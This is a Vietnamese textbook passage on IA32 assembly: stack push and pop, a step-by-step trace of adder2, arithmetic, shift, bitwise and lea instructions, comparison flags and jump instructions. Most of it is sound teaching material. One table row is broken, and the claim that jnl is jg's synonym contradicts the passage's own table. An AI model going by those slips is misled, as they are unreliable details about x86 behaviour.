<p>Trên hệ thống IA32, execution stack phát triển về phía <strong>địa chỉ thấp hơn</strong>. Giống như mọi cấu trúc dữ liệu stack, các thao tác diễn ra ở “đỉnh” stack.<br />
x86 ISA cung cấp hai lệnh (<strong>Bảng 2</strong>) để đơn giản hóa việc quản lý call stack.</p>
<ul>
<li><code>push S</code>: Đẩy một bản sao của <code>S</code> lên đỉnh stack. Tương đương với:</li>
</ul>
<pre><code>sub $4, %esp
mov S, (%esp)
</code></pre>
<ul>
<li><code>pop D</code>: Lấy phần tử trên đỉnh stack ra và đặt vào <code>D</code>. Tương đương với:</li>
</ul>
<pre><code>mov (%esp), D
add $4, %esp
</code></pre>
<p><strong>Bảng 2.</strong> Các lệnh quản lý stack.</p>
<p>Lưu ý: trong khi ba lệnh ở phần <strong>Bảng 1</strong> cần <strong>hai toán hạng</strong>, thì <code>push</code> và <code>pop</code> trong <strong>Bảng 2</strong> chỉ cần <strong>một toán hạng</strong>.</p>
<h3 id="821-kết-hợp-tất-cả-một-ví-dụ-cụ-thể-hơn"><a class="header" href="#821-kết-hợp-tất-cả-một-ví-dụ-cụ-thể-hơn">8.2.1. Kết hợp tất cả: Một ví dụ cụ thể hơn</a></h3>
<p>Hãy xem xét kỹ hơn hàm <code>adder2</code>:</p>
<pre><code class="language-c">// cộng thêm 2 vào một số nguyên và trả về kết quả
int adder2(int a) {
    return a + 2;
}
</code></pre>
<p>và code assembly tương ứng của nó:</p>
<pre><code>0804840b &lt;adder2&gt;:
    804840b:       55                      push   %ebp
    804840c:       89 e5                   mov    %esp,%ebp
    804840e:       8b 45 08                mov    0x8(%ebp),%eax
    8048411:       83 c0 02                add    $0x2,%eax
    8048414:       5d                      pop    %ebp
    8048415:       c3                      ret
</code></pre>
<p>Mã assembly của hàm này bao gồm một lệnh <code>push</code>, tiếp theo là một vài lệnh <code>mov</code>, một lệnh <code>add</code>, một lệnh <code>pop</code> và cuối cùng là lệnh <code>ret</code>.<br />
Để hiểu cách CPU thực thi tập lệnh này, chúng ta cần xem lại cấu trúc của <a href="C8-IA32/../C2-C_depth/scope_memory.html#_parts_of_program_memory_and_scope">program memory</a>.<br />
Hãy nhớ rằng mỗi khi một chương trình được thực thi, hệ điều hành sẽ cấp phát <strong>address space</strong> (không gian địa chỉ) mới cho chương trình đó (còn gọi là <strong>virtual memory</strong> – bộ nhớ ảo).<br />
Khái niệm virtual memory và <a href="C8-IA32/../C13-OS/processes.html#_processes">processes</a> (tiến trình) sẽ được trình bày chi tiết hơn ở Chương 13; hiện tại, bạn chỉ cần hiểu rằng <strong>process</strong> là một sự trừu tượng hóa của một chương trình đang chạy, và virtual memory là vùng bộ nhớ được cấp phát cho một process.<br />
Mỗi process có một vùng bộ nhớ riêng gọi là <strong>call stack</strong>. Lưu ý rằng call stack nằm trong bộ nhớ của process/virtual memory, khác với các thanh ghi (register) vốn nằm trên CPU.</p>
<p><strong>Hình 2</strong> minh họa trạng thái mẫu của call stack và các thanh ghi trước khi thực thi hàm <code>adder2</code>.</p>
<p><img src="C8-IA32/_images/ex1_1.png" alt="frame1" /><br />
<strong>Hình 2.</strong> Execution stack trước khi thực thi</p>
<p>Hãy chú ý rằng stack phát triển về phía <strong>địa chỉ thấp hơn</strong>. Các thanh ghi <code>%eax</code> và <code>%edx</code> hiện đang chứa giá trị rác.<br />
Các địa chỉ của lệnh trong code segment của program memory (0x804840b–0x8048415) đã được rút gọn thành (0x40b–0x415) để hình minh họa dễ đọc hơn.<br />
Tương tự, các địa chỉ trong call stack segment đã được rút gọn thành 0x108–0x110 thay vì 0xffffd108–0xffffd110.<br />
Trên thực tế, địa chỉ của call stack nằm ở vùng địa chỉ cao hơn so với code segment trong program memory.</p>
<p>Hãy chú ý đến giá trị ban đầu (giả định) của các thanh ghi <code>%esp</code> và <code>%ebp</code>: lần lượt là <code>0x10c</code> và <code>0x12a</code>.<br />
Call stack hiện có giá trị <code>0x28</code> (tức 40) tại địa chỉ stack <code>0x110</code> (lý do và cách giá trị này xuất hiện sẽ được giải thích trong phần <a href="C8-IA32/functions.html#_functions_in_assembly">functions</a>).<br />
Mũi tên ở góc trên bên trái trong các hình tiếp theo biểu thị lệnh đang được thực thi.<br />
Thanh ghi <code>%eip</code> (instruction pointer) cho biết lệnh tiếp theo sẽ được thực thi. Ban đầu, <code>%eip</code> chứa địa chỉ <code>0x40b</code>, tương ứng với lệnh đầu tiên trong hàm <code>adder2</code>.</p>
<p><img src="C8-IA32/_images/ex1_2.png" alt="frame2" /></p>
<p>Lệnh đầu tiên (<code>push %ebp</code>) đặt một bản sao giá trị trong <code>%ebp</code> (0x12a) lên đỉnh stack.<br />
Sau khi thực thi, <code>%eip</code> trỏ tới địa chỉ của lệnh tiếp theo (0x40c).<br />
Lệnh <code>push</code> giảm giá trị stack pointer đi 4 (tức “mở rộng” stack thêm 4 byte), dẫn đến <code>%esp</code> mới là <code>0x108</code>.<br />
Hãy nhớ rằng <code>push %ebp</code> tương đương với:</p>
<pre><code>sub $4, %esp
mov %ebp, (%esp)
</code></pre>
<p>Nói cách khác, trừ 4 khỏi <code>%esp</code> và đặt bản sao nội dung của <code>%ebp</code> vào vị trí mà <code>%esp</code> trỏ tới.</p>
<p><img src="C8-IA32/_images/ex1_3.png" alt="frame3" /></p>
<p>Hãy nhớ rằng cú pháp của <code>mov</code> là <code>mov S, D</code>, trong đó <code>S</code> là nguồn và <code>D</code> là đích.<br />
Vì vậy, lệnh tiếp theo (<code>mov %esp, %ebp</code>) cập nhật <code>%ebp</code> thành 0x108.<br />
<code>%eip</code> tăng lên để trỏ tới lệnh kế tiếp (0x40e).</p>
<p><img src="C8-IA32/_images/ex1_4.png" alt="frame4" /></p>
<p>Tiếp theo, lệnh <code>mov 0x8(%ebp), %eax</code> được thực thi.<br />
Lệnh này phức tạp hơn một chút so với lệnh <code>mov</code> trước.<br />
Theo bảng toán hạng ở phần trước, <code>0x8(%ebp)</code> tương đương M[<code>%ebp</code> + 0x8].<br />
Vì <code>%ebp</code> = 0x108, cộng thêm 8 sẽ được 0x110.<br />
Tra cứu giá trị trong bộ nhớ stack tại 0x110 cho ra 0x28 (giá trị này được đặt vào stack từ trước).<br />
Do đó, 0x28 được copy vào <code>%eax</code>.<br />
<code>%eip</code> tăng lên 0x411.</p>
<p><img src="C8-IA32/_images/ex1_5.png" alt="frame5" /></p>
<p>Sau đó, lệnh <code>add $0x2, %eax</code> được thực thi.<br />
Lệnh <code>add S, D</code> sẽ tính S + D và lưu vào D.<br />
Vì vậy, <code>add $0x2, %eax</code> cộng 0x2 vào giá trị trong <code>%eax</code> (0x28), kết quả là 0x2A được lưu vào <code>%eax</code>.<br />
<code>%eip</code> tăng lên 0x414.</p>
<p><img src="C8-IA32/_images/ex1_6.png" alt="frame6" /></p>
<p>Lệnh tiếp theo là <code>pop %ebp</code>.<br />
Lệnh này “lấy” giá trị trên đỉnh stack và đặt vào <code>%ebp</code>.<br />
Tương đương với:</p>
<pre><code>mov (%esp), %ebp
add $4, %esp
</code></pre>
<p>Sau khi thực thi, giá trị tại <code>(%esp)</code> (M[0x108]) được copy vào <code>%ebp</code>, nên <code>%ebp</code> = 0x12a.<br />
Stack pointer tăng thêm 4 (vì stack phát triển xuống địa chỉ thấp, nên khi “thu nhỏ” sẽ tăng địa chỉ).<br />
<code>%esp</code> mới là 0x10c, và <code>%eip</code> trỏ tới lệnh cuối cùng (0x415).</p>
<p>Lệnh cuối cùng là <code>ret</code>.<br />
Chúng ta sẽ tìm hiểu chi tiết hơn về <code>ret</code> khi bàn về lời gọi hàm, nhưng hiện tại chỉ cần biết rằng nó chuẩn bị call stack để trả về từ một hàm.<br />
Theo quy ước, <code>%eax</code> luôn chứa giá trị trả về (nếu có).<br />
Trong trường hợp này, hàm trả về 0x2A, tức 42 ở hệ thập phân.</p>
<p>Trước khi tiếp tục, hãy lưu ý rằng giá trị cuối cùng của <code>%esp</code> và <code>%ebp</code> lần lượt là 0x10c và 0x12a — <strong>giống hệt</strong> khi hàm bắt đầu thực thi.<br />
Đây là hành vi bình thường của call stack: nó lưu trữ biến tạm và dữ liệu của mỗi hàm khi chạy, và khi hàm kết thúc, stack trở lại trạng thái trước khi hàm được gọi.</p>
<p>Vì vậy, bạn sẽ thường thấy hai lệnh này ở đầu mỗi hàm:</p>
<pre><code>push %ebp
mov %esp, %ebp
</code></pre>
<p>và hai lệnh này ở cuối mỗi hàm:</p>
<pre><code>pop %ebp
ret
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="83-arithmetic-instructions-các-lệnh-số-học"><a class="header" href="#83-arithmetic-instructions-các-lệnh-số-học">8.3. Arithmetic Instructions (Các lệnh số học)</a></h2>
<p><strong>IA32 ISA</strong> triển khai một số lệnh tương ứng với các phép toán số học được thực hiện bởi <strong>ALU</strong>. <a href="C8-IA32/arithmetic.html#OtherArithmetic32">Bảng 1</a> liệt kê một số lệnh số học thường gặp khi đọc code assembly.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>add S, D</code></td><td>S + D → D</td></tr>
<tr><td><code>sub S, D</code></td><td>D - S → D</td></tr>
<tr><td><code>inc D</code></td><td>D + 1 → D</td></tr>
<tr><td><code>dec D</code></td><td>D - 1 → D</td></tr>
<tr><td><code>neg D</code></td><td>-D → D</td></tr>
<tr><td><code>imul S, D</code></td><td>S × D → D</td></tr>
<tr><td><code>idiv S</code></td><td><code>%eax</code> / S : Q → <code>%eax</code>, R → <code>%edx</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh số học thông dụng.</p>
<ul>
<li>Lệnh <code>add</code> và <code>sub</code> tương ứng với phép cộng và trừ, mỗi lệnh nhận hai toán hạng.</li>
<li>Ba lệnh tiếp theo là các lệnh thao tác trên một thanh ghi duy nhất, tương ứng với các phép tăng (<code>x++</code>), giảm (<code>x--</code>) và đổi dấu (<code>-x</code>) trong C.</li>
<li>Lệnh nhân (<code>imul</code>) hoạt động trên hai toán hạng và đặt kết quả vào toán hạng đích. Nếu kết quả cần nhiều hơn 32 bit để biểu diễn, giá trị sẽ bị cắt (truncate) xuống 32 bit.</li>
</ul>
<p>Lệnh chia (<code>idiv</code>) hoạt động hơi khác: trước khi thực thi <code>idiv</code>, giả định rằng thanh ghi <code>%eax</code> chứa số bị chia (dividend). Gọi <code>idiv</code> với toán hạng S sẽ chia nội dung <code>%eax</code> cho S, đưa thương số (quotient) vào <code>%eax</code> và số dư (remainder) vào <code>%edx</code>.</p>
<h3 id="831-bit-shifting-instructions-các-lệnh-dịch-bit"><a class="header" href="#831-bit-shifting-instructions-các-lệnh-dịch-bit">8.3.1. Bit Shifting Instructions (Các lệnh dịch bit)</a></h3>
<p>Các lệnh dịch bit cho phép compiler thực hiện các phép dịch bit.<br />
Các lệnh nhân và chia thường tốn nhiều thời gian để thực thi.<br />
Dịch bit cung cấp cho compiler một cách tối ưu hơn khi nhân hoặc chia cho các số là lũy thừa của 2.</p>
<p>Ví dụ: để tính <code>77 * 4</code>, hầu hết compiler sẽ dịch thành <code>77 &lt;&lt; 2</code> để tránh dùng <code>imul</code>.<br />
Tương tự, để tính <code>77 / 4</code>, compiler thường dịch thành <code>77 &gt;&gt; 2</code> để tránh dùng <code>idiv</code>.</p>
<p>Cần lưu ý rằng dịch trái và dịch phải sẽ được dịch sang các lệnh khác nhau tùy thuộc vào mục tiêu là dịch số học (arithmetic – có dấu) hay dịch logic (logical – không dấu).</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th><th>Arithmetic or Logical?</th></tr></thead><tbody>
<tr><td><code>sal v, D</code></td><td>D <code>&lt;&lt;</code> v → D</td><td>arithmetic</td></tr>
<tr><td><code>shl v, D</code></td><td>D <code>&lt;&lt;</code> v → D</td><td>logical</td></tr>
<tr><td><code>sar v, D</code></td><td>D <code>&gt;&gt;</code> v → D</td><td>arithmetic</td></tr>
<tr><td><code>shr v, D</code></td><td>D <code>&gt;&gt;</code> v → D</td><td>logical</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các lệnh dịch bit.</p>
<p>Mỗi lệnh dịch nhận hai toán hạng:</p>
<ul>
<li>Một toán hạng thường là thanh ghi (ký hiệu D).</li>
<li>Toán hạng còn lại là giá trị dịch (<em>v</em>).</li>
</ul>
<p>Trên hệ thống 32-bit, giá trị dịch được code hóa trong 1 byte (vì không có ý nghĩa khi dịch quá 31 bit).<br />
Giá trị dịch <em>v</em> phải là một hằng số hoặc được lưu trong thanh ghi <code>%cl</code>.</p>
<p><strong>Ghi chú:</strong><br />
Ở cấp độ assembly, không tồn tại khái niệm kiểu dữ liệu. Tuy nhiên, hãy nhớ rằng dịch phải hoạt động khác nhau tùy thuộc vào việc giá trị là số có dấu hay không dấu.<br />
Compiler sử dụng các lệnh khác nhau để phân biệt giữa dịch logic và dịch số học.</p>
<h3 id="832-bitwise-instructions-các-lệnh-thao-tác-bit"><a class="header" href="#832-bitwise-instructions-các-lệnh-thao-tác-bit">8.3.2. Bitwise Instructions (Các lệnh thao tác bit)</a></h3>
<p>Các lệnh thao tác bit cho phép compiler thực hiện các phép toán bitwise trên dữ liệu.<br />
Một cách compiler sử dụng các phép toán bitwise là để tối ưu hóa.<br />
Ví dụ: compiler có thể chọn thực hiện <code>77 mod 4</code> bằng <code>77 &amp; 3</code> thay vì dùng lệnh <code>idiv</code> tốn kém hơn.</p>
<p><strong>Bảng 3</strong> liệt kê các lệnh bitwise thông dụng:</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>and S, D</code></td><td>S <code>&amp;</code> D → D</td></tr>
<tr><td><code>or S, D</code></td><td>S `</td></tr>
<tr><td><code>xor S, D</code></td><td>S <code>^</code> D → D</td></tr>
<tr><td><code>not D</code></td><td><code>~</code>D → D</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các phép toán bitwise.</p>
<p>Lưu ý: <strong>bitwise <code>not</code></strong> khác với <strong>negation (<code>neg</code>)</strong>.</p>
<ul>
<li><code>not</code> đảo tất cả các bit nhưng <strong>không</strong> cộng thêm 1.</li>
<li><code>neg</code> đổi dấu số (two’s complement), tức là đảo bit rồi cộng thêm 1.<br />
Cần cẩn thận để không nhầm lẫn hai lệnh này.</li>
</ul>
<blockquote>
<blockquote>
<p><strong>Chỉ sử dụng các phép toán bitwise khi thật sự cần thiết trong code C của bạn!</strong></p>
<p>Sau khi đọc xong phần này, bạn có thể sẽ bị cám dỗ muốn thay thế các phép toán số học thông thường trong code C của mình bằng các phép dịch bit hoặc các phép toán bitwise khác. Điều này <strong>không</strong> được khuyến khích. Hầu hết các compiler hiện đại đủ thông minh để tự thay thế các phép toán số học đơn giản bằng các phép toán bitwise khi thích hợp, vì vậy lập trình viên không cần phải làm điều đó. Nguyên tắc chung là lập trình viên nên ưu tiên khả năng dễ đọc của code bất cứ khi nào có thể và tránh tối ưu hóa quá sớm. |</p>
</blockquote>
</blockquote>
<h3 id="833-lệnh-load-effective-address"><a class="header" href="#833-lệnh-load-effective-address">8.3.3. Lệnh Load Effective Address</a></h3>
<p><em>What's lea got to do (got to do) with it?</em><br />
<em>What's lea, but an effective address loading?</em><br />
~ Xin lỗi Tina Turner</p>
<p>Chúng ta cuối cùng cũng đến với <strong>load effective address</strong> hay lệnh <code>lea</code>, có lẽ là lệnh số học khiến sinh viên bối rối nhiều nhất. Lệnh này truyền thống được dùng như một cách nhanh để tính toán địa chỉ của một vị trí trong bộ nhớ. Lệnh <code>lea</code> hoạt động trên cùng cấu trúc toán hạng mà ta đã thấy từ trước đến giờ nhưng <strong>không</strong> bao gồm việc truy xuất bộ nhớ. Bất kể toán hạng chứa loại dữ liệu gì (dù là hằng số hay địa chỉ), <code>lea</code> chỉ đơn giản thực hiện phép toán số học.</p>
<p>Ví dụ: giả sử thanh ghi <code>%eax</code> chứa giá trị hằng 0x5, thanh ghi <code>%edx</code> chứa giá trị hằng 0x4, và thanh ghi <code>%ecx</code> chứa giá trị 0x808 (thực tế là một địa chỉ). <a href="C8-IA32/arithmetic.html#leaEx32">Bảng 4</a> đưa ra một số ví dụ về các phép <code>lea</code>, bản dịch và giá trị tương ứng.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th><th>Value</th></tr></thead><tbody>
<tr><td><code>lea 8(%eax), %eax</code></td><td>8 + <code>%eax</code> → <code>%eax</code></td><td>13 → <code>%eax</code></td></tr>
<tr><td><code>lea (%eax, %edx), %eax</code></td><td><code>%eax</code> + <code>%edx</code> → <code>%eax</code></td><td>9 → <code>%eax</code></td></tr>
<tr><td><code>lea (,%eax,4), %eax</code></td><td><code>%eax</code> × 4 → <code>%eax</code></td><td>20 → <code>%eax</code></td></tr>
<tr><td><code>lea -0x8(%ecx), %eax</code></td><td><code>%ecx</code> - 8 → <code>%eax</code></td><td>0x800 → <code>%eax</code></td></tr>
<tr><td><code>lea -0x4(%ecx, %edx, 2), %eax</code></td><td><code>%ecx</code> + <code>%edx</code> × 2 - 4 → <code>%eax</code></td><td>0x80c → <code>%eax</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 4.</strong> Ví dụ về các phép <code>lea</code>.</p>
<p>Trong tất cả các trường hợp, lệnh <code>lea</code> thực hiện phép toán số học trên toán hạng nguồn S và đặt kết quả vào toán hạng đích D. Lệnh <code>mov</code> giống hệt <code>lea</code> <strong>ngoại trừ</strong> việc <code>mov</code> <strong>bắt buộc</strong> phải coi nội dung của toán hạng nguồn là một địa chỉ bộ nhớ nếu nó ở dạng địa chỉ bộ nhớ. Ngược lại, <code>lea</code> thực hiện cùng phép toán (đôi khi phức tạp) trên toán hạng <strong>mà không</strong> truy xuất bộ nhớ, cho phép compiler khéo léo dùng <code>lea</code> như một phép thay thế cho một số loại phép toán số học.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="84-Điều-khiển-rẽ-nhánh-và-vòng-lặp-conditional-control-and-loops"><a class="header" href="#84-Điều-khiển-rẽ-nhánh-và-vòng-lặp-conditional-control-and-loops">8.4. Điều khiển rẽ nhánh và vòng lặp (Conditional Control and Loops)</a></h2>
<p>Phần này đề cập đến các lệnh assembly cho <a href="C8-IA32/../C1-C_intro/conditionals.html#_conditionals_and_loops">câu lệnh điều kiện và vòng lặp</a>.<br />
Hãy nhớ rằng <strong>câu lệnh điều kiện</strong> cho phép lập trình viên thay đổi luồng thực thi của chương trình dựa trên kết quả của một biểu thức điều kiện.</p>
<p>Trình biên dịch sẽ dịch các câu lệnh điều kiện thành các lệnh assembly thay đổi <strong>instruction pointer</strong> (<code>%eip</code>) để trỏ tới một địa chỉ <strong>không phải</strong> là địa chỉ kế tiếp trong chuỗi lệnh của chương trình.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="841-mở-đầu-preliminaries"><a class="header" href="#841-mở-đầu-preliminaries">8.4.1. Mở đầu (Preliminaries)</a></h3>
<h3 id="các-lệnh-so-sánh-có-điều-kiện-conditional-comparison-instructions-1"><a class="header" href="#các-lệnh-so-sánh-có-điều-kiện-conditional-comparison-instructions-1">Các lệnh so sánh có điều kiện (Conditional Comparison Instructions)</a></h3>
<p>Các lệnh so sánh thực hiện một phép toán số học nhằm phục vụ cho việc điều khiển thực thi có điều kiện của chương trình.<br />
<strong>Bảng 1</strong> liệt kê các lệnh cơ bản liên quan đến điều khiển có điều kiện.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>cmp R1, R2</code></td><td>So sánh R2 với R1 (tức là tính R2 - R1)</td></tr>
<tr><td><code>test R1, R2</code></td><td>Tính toán phép AND theo bit giữa R1 và R2</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh điều khiển có điều kiện (Conditional Control Instructions)</p>
<p>Lệnh <code>cmp</code> so sánh giá trị của hai thanh ghi R2 và R1. Cụ thể, nó thực hiện phép trừ <strong>R2 - R1</strong>.<br />
Lệnh <code>test</code> thực hiện phép <strong>AND theo bit</strong>. Một ví dụ thường gặp là:</p>
<pre><code class="language-asm">test %eax, %eax
</code></pre>
<p>Trong ví dụ này, phép AND theo bit của <code>%eax</code> với chính nó sẽ cho kết quả bằng 0 <strong>chỉ khi</strong> <code>%eax</code> chứa giá trị 0.<br />
Nói cách khác, đây là cách kiểm tra giá trị zero và tương đương với:</p>
<pre><code class="language-asm">cmp $0, %eax
</code></pre>
<p>Không giống như các lệnh số học đã đề cập trước đây, <code>cmp</code> và <code>test</code> <strong>không</strong> thay đổi giá trị của thanh ghi đích.<br />
Thay vào đó, cả hai lệnh này sẽ thay đổi một tập hợp các giá trị 1-bit gọi là <strong>cờ code điều kiện</strong> (<em>condition code flags</em>).</p>
<p>Ví dụ, <code>cmp</code> sẽ thay đổi các cờ này dựa trên việc kết quả của <strong>R2 - R1</strong> là số dương (lớn hơn), số âm (nhỏ hơn) hay bằng 0 (bằng nhau).<br />
Hãy nhớ rằng <a href="C8-IA32/../C5-Arch/cpu.html#_the_alu">condition code</a> lưu trữ thông tin về một phép toán trong ALU.<br />
Các cờ code điều kiện là một phần của thanh ghi <code>FLAGS</code> trên hệ thống x86.</p>
<div class="table-wrapper"><table><thead><tr><th>Flag</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>ZF</code></td><td>Bằng 0 (1: đúng; 0: sai)</td></tr>
<tr><td><code>SF</code></td><td>Âm (1: đúng; 0: sai)</td></tr>
<tr><td><code>OF</code></td><td>Xảy ra tràn số (1: đúng; 0: sai)</td></tr>
<tr><td><code>CF</code></td><td>Xảy ra carry trong phép toán số học (1: đúng; 0: sai)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các cờ code điều kiện thường gặp.</p>
<p><strong>Giải thích lại lệnh <code>cmp R1, R2</code>:</strong></p>
<ul>
<li><code>ZF</code> được đặt thành 1 nếu R1 và R2 bằng nhau.</li>
<li><code>SF</code> được đặt thành 1 nếu R2 <strong>nhỏ hơn</strong> R1 (tức là R2 - R1 &lt; 0).</li>
<li><code>OF</code> được đặt thành 1 nếu phép toán R2 - R1 gây tràn số nguyên (hữu ích cho so sánh số có dấu).</li>
<li><code>CF</code> được đặt thành 1 nếu phép toán R2 - R1 tạo ra carry (hữu ích cho so sánh số không dấu).</li>
</ul>
<p>Các cờ <code>SF</code> và <code>OF</code> được dùng cho so sánh số nguyên <strong>có dấu</strong>, trong khi <code>CF</code> được dùng cho so sánh số nguyên <strong>không dấu</strong>.<br />
Mặc dù việc tìm hiểu sâu về các cờ này nằm ngoài phạm vi của sách, nhưng việc <code>cmp</code> và <code>test</code> thiết lập các cờ này là điều kiện cần để nhóm lệnh tiếp theo (<em>jump instructions</em>) hoạt động chính xác.</p>
<h3 id="các-lệnh-nhảy-jump-instructions-1"><a class="header" href="#các-lệnh-nhảy-jump-instructions-1">Các lệnh nhảy (Jump Instructions)</a></h3>
<p>Lệnh nhảy cho phép chương trình “nhảy” tới một vị trí mới trong code lệnh.<br />
Trong các chương trình assembly mà ta đã phân tích, <code>%eip</code> luôn trỏ tới lệnh kế tiếp trong bộ nhớ chương trình.<br />
Các lệnh nhảy cho phép <code>%eip</code> được đặt tới một lệnh mới chưa từng thực thi (như trong câu lệnh <code>if</code>) hoặc tới một lệnh đã thực thi trước đó (như trong vòng lặp).</p>
<h4 id="lệnh-nhảy-trực-tiếp-direct-jump-instructions-1"><a class="header" href="#lệnh-nhảy-trực-tiếp-direct-jump-instructions-1">Lệnh nhảy trực tiếp (Direct jump instructions)</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Description</th></tr></thead><tbody>
<tr><td><code>jmp L</code></td><td>Nhảy tới vị trí được chỉ định bởi nhãn L</td></tr>
<tr><td><code>jmp *addr</code></td><td>Nhảy tới địa chỉ được chỉ định</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các lệnh nhảy trực tiếp.</p>
<p><strong>Bảng 3</strong> liệt kê tập hợp các lệnh nhảy trực tiếp; trong đó <code>L</code> là một <strong>symbolic label</strong> (nhãn ký hiệu), đóng vai trò như một định danh trong tệp đối tượng (object file) của chương trình.<br />
Mọi nhãn đều bao gồm một số chữ cái và chữ số, theo sau là dấu hai chấm (<code>:</code>).<br />
Nhãn có thể là <em>local</em> (cục bộ) hoặc <em>global</em> (toàn cục) trong phạm vi của một tệp đối tượng.</p>
<ul>
<li>Nhãn của hàm thường là <em>global</em> và thường bao gồm tên hàm kèm dấu hai chấm. Ví dụ: <code>main:</code> (hoặc <code>&lt;main&gt;:</code>) được dùng để đánh dấu hàm <code>main</code> do người dùng định nghĩa.</li>
<li>Theo quy ước, các nhãn có phạm vi <em>local</em> sẽ bắt đầu bằng dấu chấm (<code>.</code>). Bạn có thể bắt gặp một nhãn local như <code>.L1</code> trong ngữ cảnh của một câu lệnh <code>if</code> hoặc vòng lặp.</li>
</ul>
<p>Mỗi nhãn đều có một địa chỉ liên kết. Khi CPU thực thi lệnh <code>jmp</code>, nó sẽ thay đổi <code>%eip</code> để trỏ tới địa chỉ chương trình được chỉ định bởi nhãn <code>L</code>.<br />
Lập trình viên viết assembly cũng có thể chỉ định một địa chỉ cụ thể để nhảy tới bằng lệnh <code>jmp *</code>.</p>
<p>Đôi khi, các nhãn local được hiển thị dưới dạng <strong>offset</strong> (độ lệch) so với điểm bắt đầu của một hàm.<br />
Ví dụ, một lệnh nằm cách điểm bắt đầu của <code>main</code> 28 byte có thể được biểu diễn bằng nhãn <code>&lt;main+28&gt;</code>.</p>
<p>Ví dụ: lệnh <code>jmp 0x8048427 &lt;main+28&gt;</code> cho biết nhảy tới địa chỉ <code>0x8048427</code>, địa chỉ này có nhãn <code>&lt;main+28&gt;</code>, nghĩa là nó cách điểm bắt đầu của hàm <code>main</code> 28 byte.<br />
Khi thực thi lệnh này, <code>%eip</code> sẽ được đặt thành <code>0x8048427</code>.</p>
<h4 id="conditional-jump-instructions-lệnh-nhảy-có-điều-kiện"><a class="header" href="#conditional-jump-instructions-lệnh-nhảy-có-điều-kiện">Conditional jump instructions (Lệnh nhảy có điều kiện)</a></h4>
<p>Hành vi của các lệnh nhảy có điều kiện phụ thuộc vào các thanh ghi <strong>condition code</strong> được thiết lập bởi lệnh <code>cmp</code>.<br />
<strong>Bảng 4</strong> liệt kê tập hợp các lệnh nhảy có điều kiện thường gặp.<br />
Mỗi lệnh bắt đầu bằng chữ <code>j</code> để biểu thị đây là lệnh nhảy.<br />
Phần hậu tố (suffix) của mỗi lệnh cho biết <em>điều kiện</em> để thực hiện nhảy.<br />
Hậu tố này cũng xác định việc so sánh số sẽ được hiểu là <strong>có dấu</strong> (signed) hay <strong>không dấu</strong> (unsigned).</p>
<div class="table-wrapper"><table><thead><tr><th>Signed Comparison</th><th>Unsigned Comparison</th><th>Mô tả</th></tr></thead><tbody>
<tr><td><code>je</code> (<code>jz</code>)</td><td></td><td>nhảy nếu bằng nhau (==) hoặc nếu bằng 0</td></tr>
<tr><td><code>jne</code> (<code>jnz</code>)</td><td></td><td>nhảy nếu không bằng (!=)</td></tr>
<tr><td><code>js</code></td><td></td><td>nhảy nếu âm</td></tr>
<tr><td><code>jns</code></td><td></td><td>nhảy nếu không âm</td></tr>
<tr><td><code>jg</code> (<code>jnle</code>)</td><td><code>ja</code> (<code>jnbe</code>)</td><td>nhảy nếu lớn hơn (&gt;)</td></tr>
<tr><td><code>jge</code> (<code>jnl</code>)</td><td><code>jae</code> (<code>jnb</code>)</td><td>nhảy nếu lớn hơn hoặc bằng (&gt;=)</td></tr>
<tr><td><code>jl</code> (<code>jnge</code>)</td><td><code>jb</code> (<code>jnae</code>)</td><td>nhảy nếu nhỏ hơn (&lt;)</td></tr>
<tr><td><code>jle</code> (<code>jng</code>)</td><td><code>jbe</code> (<code>jna</code>)</td><td>nhảy nếu nhỏ hơn hoặc bằng (&lt;=)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 4.</strong> Các lệnh nhảy có điều kiện; các từ đồng nghĩa được ghi trong ngoặc.</p>
<p>Thay vì học thuộc lòng tất cả các lệnh này, bạn có thể <strong>đọc thành tiếng</strong> phần hậu tố để dễ nhớ hơn.<br />
<strong>Bảng 5</strong> liệt kê các chữ cái thường gặp trong hậu tố lệnh nhảy và ý nghĩa của chúng:</p>
<div class="table-wrapper"><table><thead><tr><th>Chữ cái</th><th>Ý nghĩa</th></tr></thead><tbody>
<tr><td><code>j</code></td><td>jump</td></tr>
<tr><td><code>n</code></td><td>not</td></tr>
<tr><td><code>e</code></td><td>equal</td></tr>
<tr><td><code>s</code></td><td>signed</td></tr>
<tr><td><code>g</code></td><td>greater (so sánh có dấu)</td></tr>
<tr><td><code>l</code></td><td>less (so sánh có dấu)</td></tr>
<tr><td><code>a</code></td><td>above (so sánh không dấu)</td></tr>
<tr><td><code>b</code></td><td>below (so sánh không dấu)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 5.</strong> Hậu tố của lệnh nhảy.</p>
<p>Ví dụ:</p>
<ul>
<li><code>jg</code> nghĩa là <em>jump greater</em> (nhảy nếu lớn hơn), và từ đồng nghĩa dạng signed của nó là <code>jnl</code> (<em>jump not less</em>).</li>
<li>Phiên bản unsigned <code>ja</code> nghĩa là <em>jump above</em>, còn từ đồng nghĩa <code>jnbe</code> nghĩa là <em>jump not below or equal</em>.</li>
</ul>
<p>Việc đọc thành tiếng giúp bạn hiểu tại sao một số từ đồng nghĩa lại tương ứng với các lệnh cụ thể.<br />
